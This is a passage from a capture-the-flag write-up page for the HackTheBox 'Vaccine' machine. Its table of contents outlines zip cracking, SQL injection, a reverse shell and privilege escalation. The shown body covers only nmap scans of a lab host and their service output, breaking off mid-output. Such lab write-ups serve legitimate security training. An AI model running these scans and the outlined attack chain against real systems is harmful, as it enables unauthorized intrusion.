<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HackTheBox - Vaccine Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Vaccine Writeup" />
<meta property="og:description" content="Enumeration Top 1000 ports scan 1 sudo nmap -sC -sV -oN nmap/initial 10.10.10.46 the result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Nmap 7.91 scan initiated Sat Jun 5 20:45:49 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.46 Nmap scan report for 10.10.10.46 Host is up (2.2s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shafiqaiman.com/posts/htb/vaccine/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/vaccine/featured.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-07-21T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/vaccine/featured.png"/>
<meta name="twitter:title" content="HackTheBox - Vaccine Writeup"/>
<meta name="twitter:description" content="Enumeration Top 1000 ports scan 1 sudo nmap -sC -sV -oN nmap/initial 10.10.10.46 the result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Nmap 7.91 scan initiated Sat Jun 5 20:45:49 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.46 Nmap scan report for 10.10.10.46 Host is up (2.2s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3."/>
<meta name="application-name" content="SHAFIQAIMAN">
<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/vaccine/" /><link rel="prev" href="https://shafiqaiman.com/posts/thm/agent_sudo/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/unified/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HackTheBox - Vaccine Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/vaccine\/"
        },"genre": "posts","keywords": "sqlmap, sql-union, GTFOBins","wordcount":  1006 ,
        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/vaccine\/","datePublished": "2021-07-21T00:00:00+00:00","dateModified": "2021-07-21T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "SHAFIQAIMAN"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Vaccine Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SHAFIQAIMAN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="21-07-2021">21-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1006 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#ftp">FTP</a></li>
    <li><a href="#zip2john">Zip2John</a>
      <ul>
        <li><a href="#john-the-ripperjtr">John-The-Ripper[JtR]</a></li>
        <li><a href="#content-of-the-zipfile">Content of the ZipFile</a></li>
      </ul>
    </li>
    <li><a href="#the-website">The Website</a>
      <ul>
        <li><a href="#sqlmap">SQLmap</a></li>
        <li><a href="#union-select">UNION select</a></li>
        <li><a href="#finding-columns-for-attack">Finding Columns for attack</a></li>
        <li><a href="#python-script">Python script</a></li>
        <li><a href="#finding-columns-with-useful-data">Finding Columns with useful data</a></li>
      </ul>
    </li>
    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
      <ul>
        <li><a href="#the-version-of-database">The Version of database</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a></li>
    <li><a href="#reverse-shell">Reverse Shell</a></li>
    <li><a href="#ssh">SSH</a></li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#root">Root</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="enumeration">Enumeration</h2>
<ul>
<li>Top 1000 ports scan</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>the result</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">49</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">997</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">6</span><span class="n">build1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="n">c0</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">91</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">a4</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">ac</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">51</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">42</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">MegaCorp</span><span class="w"> </span><span class="n">Login</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OSs</span><span class="p">:</span><span class="w"> </span><span class="n">Unix</span><span class="p">,</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">09</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 199.30 seconds
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>All ports scan</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>the result</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sun</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">52</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">28</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65532</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">6</span><span class="n">build1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="n">c0</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">91</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">a4</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">ac</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">51</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">42</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
